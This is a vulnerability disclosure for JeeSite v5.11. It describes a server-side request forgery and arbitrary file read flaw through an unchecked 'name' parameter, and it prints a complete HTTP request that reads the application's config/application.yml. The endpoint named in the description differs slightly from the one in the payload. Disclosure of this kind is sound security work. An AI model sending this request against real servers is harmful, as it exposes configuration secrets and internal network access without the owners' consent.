# JeeSite 5 SSRF & Arbitrary File Read Vulnerability

**Version: JeeSite v5.11**

**Google Dork: N/A**

**Date: 05/21/2025**

**Tested on: Windows 11, Java 17, MySQL 8.0**

**Software Link: https://gitee.com/thinkgem/jeesite5**

**Description:** A Server-Side Request Forgery (SSRF) and Arbitrary File Read vulnerability exists in JeeSite version 5.11.1 (Spring Boot 3) due to improper input validation of the name parameter in the /cms/fileTemplate/form endpoint. This parameter is propagated through multiple layers and ultimately passed into the Spring ResourceLoader.getResource() method, which accepts multiple URI schemes such as file:, http:, classpath:, etc. An attacker can exploit this chain to read local files or make arbitrary requests from the server.

**code analysis**

The vulnerable parameter name is passed from the controller layer without proper validation and directly used in the method fileTempleteService.getFileTemplete(name). This value propagates through multiple layers and reaches ResourceUtils.getResource(location), which allows loading arbitrary resources based on attacker-controlled input. If external protocols such as http:// or ftp:// are allowed, this may lead to Server-Side Request Forgery (SSRF) or arbitrary file access.
![image](https://github.com/user-attachments/assets/19e0d29c-1c97-4d2f-b106-f2a1d20e4379)
![image](https://github.com/user-attachments/assets/97f54cac-5e16-4a96-9b63-77c90e8a2cf2)
![image](https://github.com/user-attachments/assets/84f8c3c7-5dc2-4dad-a126-e3ddfc594cd8)
![image](https://github.com/user-attachments/assets/a2e94478-fd37-476f-84a2-9eb8aae7af12)

**Payload used:**

```
GET /js/a/cms/template/form?name=config/application.yml HTTP/1.1
Host: 127.0.0.1:8980
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Referer: http://127.0.0.1:8980/js/a/cms/template/list
Cookie: JSESSIONID=8F2ED5B5FD025A957A9AA816DC77F8F9; jeesite.session.id=2f33cb12f37f4f6a8c780d8ceecc3060; Hm_lvt_65b88e88a94e0118de2962f328f17622=1747735452; Hm_lpvt_65b88e88a94e0118de2962f328f17622=1747755826; HMACCOUNT=20448B96275CF94A;
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=4
```

Example：
![image](https://github.com/user-attachments/assets/97540dfb-7c41-4908-9565-0058267b6a86)
![image](https://github.com/user-attachments/assets/c6652df2-7fd3-457e-ad0d-620afe620ee4)
![image](https://github.com/user-attachments/assets/37fc04fd-88f0-4e53-b081-6e8d0bc9e1ab)



